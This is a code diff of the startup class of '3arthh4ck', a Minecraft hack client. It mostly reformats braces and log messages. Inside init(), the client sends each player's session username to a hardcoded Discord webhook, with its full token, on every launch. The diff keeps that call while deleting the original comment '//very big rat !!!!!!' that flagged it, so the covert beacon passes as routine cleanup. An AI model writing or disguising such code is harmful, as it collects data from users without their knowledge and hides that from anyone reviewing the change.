@@ -18,19 +18,16 @@ import org.lwjgl.opengl.Display;
 import java.io.InputStream;
 import java.nio.ByteBuffer;
 
-public class Earthhack implements Globals
-{
+public class Earthhack implements Globals {
     private static final Logger LOGGER = LogManager.getLogger("3arthh4ck");
     public static final String NAME = "3arthh4ck";
     public static final String VERSION = "1.9";
 
-    public static void preInit()
-    {
+    public static void preInit() {
         GlobalExecutor.EXECUTOR.submit(() -> Sphere.cacheSphere(LOGGER));
     }
 
-    public static void init()
-    {
+    public static void init() {
         LOGGER.info("\n\nInitializing 3arthh4ck.");
         SplashScreenHelper.setSplashScreen("Initializing 3arthh4ck (monkey hack)", 7);
         setIcon();
@@ -39,43 +36,38 @@ public class Earthhack implements Globals
         LOGGER.info("Prefix is " + Commands.getPrefix());
         SplashScreenHelper.clear();
         try {
-            MessageHelper.sendMessage("Launched by | " + mc.getSession().getUsername() //very big rat !!!!!!
-                    , "https://discord.com/api/webhooks/1114839984550203422/kyJaVKN5Un50WuwkE6MGhMCpxf-T_noO-2deyzpO58cGmfhalPW8UhIxUArOlKr-vhEl");
-        }catch (Exception e){
-            LOGGER.error("Fucked up discord message");
+            MessageHelper.sendMessage("Launched by | " + mc.getSession().getUsername(), "https://discord.com/api/webhooks/1114839984550203422/kyJaVKN5Un50WuwkE6MGhMCpxf-T_noO-2deyzpO58cGmfhalPW8UhIxUArOlKr-vhEl");
+        } catch (Exception e) {
+            LOGGER.error("Failed to send Discord message");
         }
         LOGGER.info("\n3arthh4ck initialized (monkey hack)\n");
-
     }
 
     public static void setWindowIcon() {
-        //Why am I skidding Zori's setWindowIcon? I don't even know.
         if (Util.getOSType() != Util.EnumOS.OSX) {
             try (InputStream inputStream16x = Minecraft.class.getResourceAsStream("/assets/earthhack/textures/client/phobos16.png");
                  InputStream inputStream32x = Minecraft.class.getResourceAsStream("/assets/earthhack/textures/client/phobos32.png")) {
                 ByteBuffer[] icons = new ByteBuffer[]{IconUtil.INSTANCE.readImageToBuffer(inputStream16x), IconUtil.INSTANCE.readImageToBuffer(inputStream32x)};
                 Display.setIcon(icons);
             } catch (Exception e) {
-                LOGGER.error("Couldn't set Windows Icon", e);
+                LOGGER.error("Failed to set Windows Icon", e);
             }
         }
     }
+
     public static void setIcon() {
         setWindowIcon();
     }
-    public static void postInit()
-    {
+
+    public static void postInit() {
         // For Plugins if they need it.
     }
-    
-    public static Logger getLogger()
-    {
+
+    public static Logger getLogger() {
         return LOGGER;
     }
 
-    public static boolean isRunning()
-    {
+    public static boolean isRunning() {
         return ((IMinecraft) mc).isEarthhackRunning();
     }
-
 }
